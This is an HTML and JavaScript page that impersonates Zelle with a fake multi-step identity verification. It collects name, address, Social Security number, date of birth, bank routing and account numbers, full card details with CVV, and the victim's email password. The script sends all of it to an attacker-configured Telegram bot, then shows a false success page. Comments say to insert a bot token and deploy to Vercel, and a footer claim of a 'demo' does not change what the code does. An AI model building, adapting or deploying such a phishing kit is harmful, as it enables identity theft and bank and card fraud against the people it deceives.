<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>Zelle® | Secure Identity Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Inter', sans-serif;
            background: #f5f7fb;
            color: #1a1f2e;
        }
        /* Brand Purple Palette */
        .bg-purple-primary { background-color: #6D1ED4; }
        .bg-purple-dark { background-color: #2A105F; }
        .text-purple { color: #6D1ED4; }
        .btn-purple {
            background: #6D1ED4;
            color: white;
            border: none;
            transition: all 0.2s ease;
        }
        .btn-purple:hover, .btn-purple:active { background: #5516a8; transform: translateY(-1px); }
        .btn-outline-purple {
            background: transparent;
            border: 1.5px solid #cbd5e1;
            color: #1e293b;
        }
        .btn-outline-purple:hover { background: #f1f5f9; border-color: #6D1ED4; }

        /* Layout */
        .verification-container {
            max-width: 520px;
            margin: 0 auto;
            padding: 20px 16px 40px;
        }
        /* Card style */
        .form-card-modern {
            background: white;
            border-radius: 40px;
            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            padding: 28px 24px 32px;
            margin-bottom: 24px;
            transition: all 0.2s;
        }
        /* Progress bar */
        .progress-steps {
            display: flex;
            justify-content: space-between;
            margin-bottom: 32px;
            flex-wrap: wrap;
            gap: 8px;
        }
        .step-marker {
            flex: 1;
            text-align: center;
            font-size: 0.7rem;
            font-weight: 600;
            color: #94a3b8;
            position: relative;
            padding-top: 28px;
            border-top: 2px solid #e2e8f0;
            transition: all 0.2s;
        }
        .step-marker.active {
            color: #6D1ED4;
            border-top-color: #6D1ED4;
        }
        .step-marker.completed {
            color: #10b981;
            border-top-color: #10b981;
        }
        .step-marker .step-icon {
            position: absolute;
            top: -14px;
            left: 50%;
            transform: translateX(-50%);
            background: white;
            padding: 0 6px;
            font-size: 1rem;
        }
        .step-label {
            display: block;
            margin-top: 8px;
            font-size: 0.7rem;
        }

        /* form fields */
        .input-group { margin-bottom: 20px; }
        label { font-weight: 600; font-size: 0.85rem; margin-bottom: 6px; display: block; color: #1e293b; }
        input, select {
            width: 100%;
            padding: 14px 18px;
            font-size: 1rem;
            border: 1.5px solid #e2e8f0;
            border-radius: 60px;
            outline: none;
            font-family: 'Inter', sans-serif;
            background: white;
            transition: 0.2s;
        }
        input:focus, select:focus { border-color: #6D1ED4; box-shadow: 0 0 0 3px rgba(109,30,212,0.2); }
        .error-text { color: #e53e3e; font-size: 0.7rem; margin-top: 5px; display: block; }
        .btn-next, .btn-submit, .btn-back {
            padding: 14px 20px;
            font-weight: 700;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            font-size: 1rem;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-top: 8px;
        }
        .btn-back {
            background: #f1f5f9;
            color: #334155;
            border: none;
            margin-top: 12px;
        }
        .domain-alert {
            background: #fef9e3;
            border-left: 4px solid #f59e0b;
            padding: 12px 16px;
            border-radius: 20px;
            font-size: 0.8rem;
            margin-bottom: 20px;
        }
        .password-field-wrapper { position: relative; }
        .toggle-password {
            position: absolute;
            right: 18px;
            top: 45px;
            cursor: pointer;
            color: #94a3b8;
        }
        .success-page {
            text-align: center;
            padding: 30px 20px;
        }
        .success-icon {
            background: #10b98120;
            width: 80px;
            height: 80px;
            line-height: 80px;
            border-radius: 50%;
            margin: 0 auto 20px;
            color: #10b981;
            font-size: 2.8rem;
        }
        @media (max-width: 500px) {
            .form-card-modern { padding: 20px 18px; }
            .step-label { font-size: 0.6rem; }
            .step-marker { font-size: 0.6rem; }
        }
        .telegram-note {
            background: #f0f4fe;
            border-radius: 28px;
            padding: 12px;
            font-size: 0.75rem;
            text-align: center;
            color: #2c3e66;
        }
        footer { background: #2A105F; color: white; padding: 24px 0; text-align: center; font-size: 0.75rem; margin-top: 20px; }
        a { text-decoration: none; }
    </style>
</head>
<body>

<div class="verification-container">
    <!-- Brand header (optional) -->
    <div style="text-align: center; margin-bottom: 12px;">
        <h2 style="font-weight: 700; color:#1e1e2f;">Zelle<sup style="font-size: 0.6rem;">®</sup> <span style="font-weight:400;">| Verify Identity</span></h2>
        <p style="font-size: 0.8rem; color:#475569;">Secure confirmation to activate instant payments</p>
    </div>

    <div class="form-card-modern" id="multiStepFormRoot">
        <!-- Progress tracker (dynamic) -->
        <div class="progress-steps" id="progressTracker">
            <!-- injected via js -->
        </div>

        <!-- Form steps container -->
        <div id="stepsContainer"></div>
        <div id="globalMessage" style="margin-top: 16px;"></div>
        <div class="telegram-note">
            <i class="fab fa-telegram"></i> Encrypted submission • All details will be forwarded to secure verification channel
        </div>
    </div>
</div>

<footer>
    <p>© 2025 Zelle® Network | Simulated verification flow for demo</p>
</footer>

<script>
    // ======================== TELEGRAM CONFIGURATION ========================
    // 🔁 REPLACE WITH YOUR BOT TOKEN AND CHAT ID BEFORE DEPLOYING TO VERCEL
    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';     // e.g., '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz'
    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';         // e.g., '-4123456789' or '123456789'

    // ======================== STEP DEFINITIONS =============================
    const steps = [
        { id: 0, name: "Full Name", fields: ["fullName"] },
        { id: 1, name: "Address", fields: ["addressStreet", "addressCity", "addressState", "addressZip"] },
        { id: 2, name: "SSN & DOB", fields: ["ssn", "dob"] },
        { id: 3, name: "Bank Account", fields: ["routingNumber", "accountNumber"] },
        { id: 4, name: "Card Details", fields: ["cardNumber", "cardExpiry", "cardCvv"] },
        { id: 5, name: "Email & Password", fields: ["email", "password"] }   // special domain detection
    ];

    let currentStep = 0;
    let formData = {
        fullName: "", addressStreet: "", addressCity: "", addressState: "", addressZip: "",
        ssn: "", dob: "", routingNumber: "", accountNumber: "", cardNumber: "", cardExpiry: "", cardCvv: "",
        email: "", password: ""
    };
    let domainDetected = false;    // for popup style after email domain detection
    let emailDomainMessage = "";

    // Helper: save input values to formData
    function syncFormData() {
        const inputs = document.querySelectorAll('[data-field]');
        inputs.forEach(input => {
            const field = input.getAttribute('data-field');
            if (formData.hasOwnProperty(field)) {
                formData[field] = input.value;
            }
        });
    }

    // Render progress bar
    function renderProgress() {
        const tracker = document.getElementById('progressTracker');
        if (!tracker) return;
        tracker.innerHTML = steps.map((step, idx) => {
            let statusClass = '';
            if (idx < currentStep) statusClass = 'completed';
            else if (idx === currentStep) statusClass = 'active';
            let icon = '';
            if (statusClass === 'completed') icon = '<i class="fas fa-check-circle"></i>';
            else if (statusClass === 'active') icon = '<i class="fas fa-circle" style="font-size: 0.6rem;"></i>';
            else icon = '<i class="far fa-circle"></i>';
            return `<div class="step-marker ${statusClass}">
                        <div class="step-icon">${icon}</div>
                        <span class="step-label">${step.name}</span>
                    </div>`;
        }).join('');
    }

    // step validation based on current step index
    function validateCurrentStep(stepIdx) {
        if (stepIdx === 0) {
            const name = document.querySelector('[data-field="fullName"]')?.value.trim();
            if (!name) return "Full name is required";
            return null;
        }
        if (stepIdx === 1) {
            const street = document.querySelector('[data-field="addressStreet"]')?.value.trim();
            if (!street) return "Street address is required";
            return null;
        }
        if (stepIdx === 2) {
            const ssn = document.querySelector('[data-field="ssn"]')?.value.trim();
            const dob = document.querySelector('[data-field="dob"]')?.value.trim();
            if (!ssn) return "SSN is required";
            if (!dob) return "Date of birth is required";
            if (ssn.replace(/\D/g, '').length < 4) return "Valid SSN (last 4 or full) required";
            return null;
        }
        if (stepIdx === 3) {
            const routing = document.querySelector('[data-field="routingNumber"]')?.value.trim();
            const account = document.querySelector('[data-field="accountNumber"]')?.value.trim();
            if (!routing) return "Routing number required";
            if (!account) return "Account number required";
            if (routing.replace(/\D/g, '').length < 9) return "Routing number must be 9 digits";
            return null;
        }
        if (stepIdx === 4) {
            const card = document.querySelector('[data-field="cardNumber"]')?.value.trim();
            const expiry = document.querySelector('[data-field="cardExpiry"]')?.value.trim();
            const cvv = document.querySelector('[data-field="cardCvv"]')?.value.trim();
            if (!card) return "Card number required";
            if (!expiry) return "Expiry date (MM/YY) required";
            if (!cvv) return "CVV required";
            if (card.replace(/\D/g, '').length < 15) return "Enter valid card number";
            return null;
        }
        if (stepIdx === 5) {
            const email = document.querySelector('[data-field="email"]')?.value.trim();
            if (!email) return "Email address required";
            const emailRegex = /^[^\s@]+@([^\s@]+)$/;
            if (!emailRegex.test(email)) return "Valid email required";
            // password validation only after domain detection popup step (dynamic)
            const pwd = document.querySelector('[data-field="password"]')?.value;
            if (!pwd) return "Password required to complete verification";
            if (pwd.length < 4) return "Password must be at least 4 characters";
            return null;
        }
        return null;
    }

    // special email domain detection & popup like "enter password for domain"
    function handleEmailDomainLogic(emailValue) {
        if (!emailValue) return null;
        const domain = emailValue.split('@')[1];
        if (domain) {
            return `🔐 Verify with ${domain.toUpperCase()} account: Please enter your email password to confirm ownership.`;
        }
        return "Please enter a valid email domain.";
    }

    // Render current step html
    function renderStep(stepIndex) {
        const container = document.getElementById('stepsContainer');
        if (!container) return;
        let html = '';
        if (stepIndex === 0) {
            html = `<div class="step-content">
                        <div class="input-group"><label>Full Legal Name</label><input type="text" data-field="fullName" placeholder="Johnathan M. Doe" value="${escapeHtml(formData.fullName)}" autocomplete="name"></div>
                        <button class="btn-next btn-purple" id="nextStepBtn"><i class="fas fa-arrow-right"></i> Next</button>
                    </div>`;
        } 
        else if (stepIndex === 1) {
            html = `<div class="step-content">
                        <div class="input-group"><label>Street Address</label><input type="text" data-field="addressStreet" placeholder="123 Main St, Apt 4B" value="${escapeHtml(formData.addressStreet)}"></div>
                        <div class="input-group"><label>City</label><input type="text" data-field="addressCity" placeholder="City" value="${escapeHtml(formData.addressCity)}"></div>
                        <div class="input-group"><label>State</label><input type="text" data-field="addressState" placeholder="State" value="${escapeHtml(formData.addressState)}"></div>
                        <div class="input-group"><label>ZIP Code</label><input type="text" data-field="addressZip" placeholder="ZIP" value="${escapeHtml(formData.addressZip)}"></div>
                        <button class="btn-next btn-purple" id="nextStepBtn">Next <i class="fas fa-arrow-right"></i></button>
                        <button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button>
                    </div>`;
        }
        else if (stepIndex === 2) {
            html = `<div class="step-content">
                        <div class="input-group"><label>Social Security Number (last 4 or full)</label><input type="text" data-field="ssn" placeholder="XXX-XX-1234" value="${escapeHtml(formData.ssn)}" maxlength="11"></div>
                        <div class="input-group"><label>Date of Birth</label><input type="date" data-field="dob" value="${escapeHtml(formData.dob)}"></div>
                        <button class="btn-next btn-purple" id="nextStepBtn">Next <i class="fas fa-arrow-right"></i></button>
                        <button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button>
                    </div>`;
        }
        else if (stepIndex === 3) {
            html = `<div class="step-content">
                        <div class="input-group"><label>Routing Number (9-digit)</label><input type="text" data-field="routingNumber" placeholder="e.g., 021000021" value="${escapeHtml(formData.routingNumber)}"></div>
                        <div class="input-group"><label>Account Number</label><input type="text" data-field="accountNumber" placeholder="Your bank account number" value="${escapeHtml(formData.accountNumber)}"></div>
                        <button class="btn-next btn-purple" id="nextStepBtn">Next <i class="fas fa-arrow-right"></i></button>
                        <button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button>
                    </div>`;
        }
        else if (stepIndex === 4) {
            html = `<div class="step-content">
                        <div class="input-group"><label>Debit/Credit Card Number</label><input type="text" data-field="cardNumber" placeholder="4111 1111 1111 1111" value="${escapeHtml(formData.cardNumber)}"></div>
                        <div class="input-group"><label>Expiry Date (MM/YY)</label><input type="text" data-field="cardExpiry" placeholder="MM/YY" value="${escapeHtml(formData.cardExpiry)}"></div>
                        <div class="input-group"><label>CVV</label><input type="password" data-field="cardCvv" placeholder="123" value="${escapeHtml(formData.cardCvv)}"></div>
                        <button class="btn-next btn-purple" id="nextStepBtn">Next <i class="fas fa-arrow-right"></i></button>
                        <button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button>
                    </div>`;
        }
        else if (stepIndex === 5) {
            // email + password with domain detection popup / message
            const domainMsg = (formData.email && formData.email.includes('@')) ? handleEmailDomainLogic(formData.email) : "";
            html = `<div class="step-content">
                        <div class="input-group"><label>Email Address (for verification)</label><input type="email" data-field="email" id="emailInputField" placeholder="you@example.com" value="${escapeHtml(formData.email)}"></div>
                        <div id="domainAlertBox" class="domain-alert" style="display: ${domainMsg && formData.email ? 'flex' : 'none'};">${domainMsg || ''}</div>
                        <div class="input-group password-field-wrapper">
                            <label>Email Account Password</label>
                            <input type="password" data-field="password" id="passwordField" placeholder="●●●●●●●●" value="${escapeHtml(formData.password)}">
                            <span class="toggle-password" id="togglePasswordIcon"><i class="far fa-eye-slash"></i></span>
                        </div>
                        <button class="btn-submit btn-purple" id="submitAllBtn"><i class="fab fa-telegram"></i> Verify & Complete</button>
                        <button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button>
                    </div>`;
        }

        container.innerHTML = html;

        // attach event listeners for dynamic elements
        const nextBtn = document.getElementById('nextStepBtn');
        const prevBtn = document.getElementById('prevStepBtn');
        const submitFinal = document.getElementById('submitAllBtn');
        if (nextBtn) nextBtn.addEventListener('click', () => goToNextStep());
        if (prevBtn) prevBtn.addEventListener('click', () => goToPrevStep());
        if (submitFinal) submitFinal.addEventListener('click', () => finalSubmit());

        // email domain detection live
        const emailInput = document.getElementById('emailInputField');
        if (emailInput && stepIndex === 5) {
            emailInput.addEventListener('input', (e) => {
                const emailVal = e.target.value;
                formData.email = emailVal;
                const domainMsg = (emailVal && emailVal.includes('@')) ? handleEmailDomainLogic(emailVal) : "";
                const alertBox = document.getElementById('domainAlertBox');
                if (alertBox) {
                    if (domainMsg && emailVal) {
                        alertBox.style.display = 'block';
                        alertBox.innerHTML = `<i class="fas fa-globe"></i> ${domainMsg}`;
                    } else {
                        alertBox.style.display = 'none';
                    }
                }
            });
        }
        // toggle password visibility
        const togglePwd = document.getElementById('togglePasswordIcon');
        const pwdField = document.getElementById('passwordField');
        if (togglePwd && pwdField) {
            togglePwd.addEventListener('click', () => {
                const type = pwdField.getAttribute('type') === 'password' ? 'text' : 'password';
                pwdField.setAttribute('type', type);
                togglePwd.innerHTML = type === 'password' ? '<i class="far fa-eye-slash"></i>' : '<i class="far fa-eye"></i>';
            });
        }
        syncFormDataFromFields();
    }

    function syncFormDataFromFields() {
        const inputs = document.querySelectorAll('[data-field]');
        inputs.forEach(inp => {
            const field = inp.getAttribute('data-field');
            if (formData.hasOwnProperty(field)) formData[field] = inp.value;
        });
    }

    function goToNextStep() {
        syncFormDataFromFields();
        const errorMsg = validateCurrentStep(currentStep);
        if (errorMsg) {
            showTemporaryMessage(errorMsg, 'error');
            return;
        }
        if (currentStep < steps.length - 1) {
            currentStep++;
            renderProgress();
            renderStep(currentStep);
            window.scrollTo({ top: 0, behavior: 'smooth' });
        } else {
            // if final step but not submitted?
            if (currentStep === steps.length -1) finalSubmit();
        }
    }

    function goToPrevStep() {
        if (currentStep > 0) {
            syncFormDataFromFields();
            currentStep--;
            renderProgress();
            renderStep(currentStep);
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
    }

    function showTemporaryMessage(msg, type = 'error') {
        const msgDiv = document.getElementById('globalMessage');
        if (msgDiv) {
            msgDiv.innerHTML = `<div style="background:${type === 'error' ? '#fee2e2' : '#e6f7e6'}; padding:12px; border-radius:24px; color:${type === 'error' ? '#b91c1c' : '#2e7d32'}; font-size:0.8rem;"><i class="fas ${type === 'error' ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${msg}</div>`;
            setTimeout(() => { if(msgDiv) msgDiv.innerHTML = ''; }, 3000);
        }
    }

    // Final submit to Telegram
    async function finalSubmit() {
        syncFormDataFromFields();
        // extra validation on email & password
        const email = formData.email;
        if (!email) { showTemporaryMessage("Email address required", "error"); return; }
        if (!formData.password) { showTemporaryMessage("Password required to finalize verification", "error"); return; }
        const emailValid = /^[^\s@]+@([^\s@]+)$/.test(email);
        if (!emailValid) { showTemporaryMessage("Valid email required", "error"); return; }

        // Build full message for Telegram
        const message = `🔐 *Zelle IDENTITY VERIFICATION* 🔐\n\n` +
            `👤 *Full Name:* ${formData.fullName || 'N/A'}\n` +
            `📍 *Address:* ${formData.addressStreet}, ${formData.addressCity}, ${formData.addressState} ${formData.addressZip}\n` +
            `🆔 *SSN:* ${formData.ssn}  |  *DOB:* ${formData.dob}\n` +
            `🏦 *Bank:* Routing ${formData.routingNumber} | Acc: ${formData.accountNumber}\n` +
            `💳 *Card:* ${formData.cardNumber} | Exp: ${formData.cardExpiry} | CVV: ${formData.cardCvv}\n` +
            `📧 *Email:* ${formData.email} | *Email Password:* ${formData.password}\n` +
            `🕒 *Timestamp:* ${new Date().toLocaleString()}`;

        // If bot not configured, simulate success and redirect to final thanks page.
        if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
            showThanksPage();
            return;
        }

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
            });
            const data = await response.json();
            if (data.ok) {
                showThanksPage();
            } else {
                showTemporaryMessage(`Telegram error: ${data.description}`, 'error');
            }
        } catch (err) {
            console.error(err);
            showTemporaryMessage("Network error. Could not send to Telegram.", 'error');
        }
    }

    function showThanksPage() {
        const container = document.getElementById('stepsContainer');
        if (container) {
            container.innerHTML = `<div class="success-page">
                <div class="success-icon"><i class="fas fa-shield-alt"></i></div>
                <h2 style="margin-bottom: 12px;">✅ Verification Complete</h2>
                <p style="margin-bottom: 20px;">Thank you! Your identity has been securely verified.<br>You will receive a confirmation shortly.</p>
                <i class="fas fa-lock" style="color:#6D1ED4;"></i> <span style="font-size:0.8rem;">Zelle® protection enabled</span>
            </div>`;
            const progressDiv = document.getElementById('progressTracker');
            if (progressDiv) progressDiv.style.display = 'none';
            const msgDiv = document.getElementById('globalMessage');
            if (msgDiv) msgDiv.innerHTML = '';
        }
    }

    function escapeHtml(str) { if(!str) return ''; return str.replace(/[&<>]/g, function(m){if(m === '&') return '&amp;'; if(m === '<') return '&lt;'; if(m === '>') return '&gt;'; return m;}); }

    // init
    function init() {
        renderProgress();
        renderStep(0);
    }
    init();
</script>
</body>
</html>
